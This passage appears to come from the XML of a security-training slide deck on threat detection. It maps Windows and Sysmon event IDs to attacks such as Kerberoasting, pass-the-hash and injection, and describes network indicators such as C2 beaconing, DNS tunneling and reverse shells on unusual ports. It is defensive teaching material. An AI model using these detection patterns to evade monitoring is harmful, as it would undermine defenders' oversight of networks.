                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kerberoasting ticket harvesting</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>4776</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NTLM authentication</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NTLM relay attacks and pass-the-hash</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305358">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>1102</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Security</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Audit log cleared</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Defense evasion, high severity</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305364">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>7045</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>System</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>New service installed</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Persistence via malicious service</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>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Microsoft Sysmon, Configuration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Sysmon's detection value depends entirely on its configuration. A poorly configured Sysmon generates noise; a well-tuned configuration, guided by community rulesets, provides surgical precision.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Microsoft Sysmon, Configuration Deep Dive (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_sysmon_configuration_workflow.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="2421134"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="37911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Sysmon configuration lifecycle: XML rules define what events the kernel driver captures, filtering noise before events reach the SIEM.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Microsoft Sysmon, Configuration Deep Dive (3/3)</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2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638840"/>
              </a:tblGrid>
              <a:tr h="304012">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Sysmon Event ID</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Event Name</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Key Fields Captured</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Primary Use Case</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304012">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>1</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Process Create</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CommandLine, ParentImage, Hashes, User</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Execution chain analysis</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304012">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>3</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Network Connect</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SourceIP, DestinationIP, Port, ProcessName</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>C2 beaconing detection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304012">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>7</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Image Loaded</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ImageLoaded, Signed, SignatureStatus</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>DLL injection detection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304012">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>8</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CreateRemoteThread</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SourceProcessId, TargetProcessId</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Process injection detection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304012">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>11</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>File Created</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TargetFilename, CreationTime</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Dropper and payload delivery</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304012">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>12/13</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Registry Key/Value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TargetObject, Details</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Persistence via Run keys</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304014">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>22</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>DNS Query</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>QueryName, QueryResults</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>C2 domain resolution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">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Network-Based Indicators of Compromise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Host-based telemetry reveals what a process is doing locally. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network-based IOCs</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> reveal where it is communicating, exposing command-and-control channels, data exfiltration paths, and lateral movement activity.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Network-Based Indicators of Compromise (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_network_ioc_detection.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Network-based IOC detection layers: perimeter logs, internal netflow, and DNS telemetry each reveal different phases of an attack lifecycle.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Network-Based Indicators of Compromise (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="12115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Beaconing Patterns:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Malware communicating with C2 at fixed intervals (e.g., every 60 seconds) creates a detectable "heartbeat" in netflow data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS Tunneling:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Attackers encode data in DNS query subdomain labels to exfiltrate data through permissive DNS egress policies (MITRE ATT&amp;CK T1071.004).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Unusual Outbound Ports:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> HTTPS traffic on port 4444 or 8080 may indicate a Metasploit Meterpreter reverse shell (MITRE ATT&amp;CK T1571).</a:t>
            </a:r>
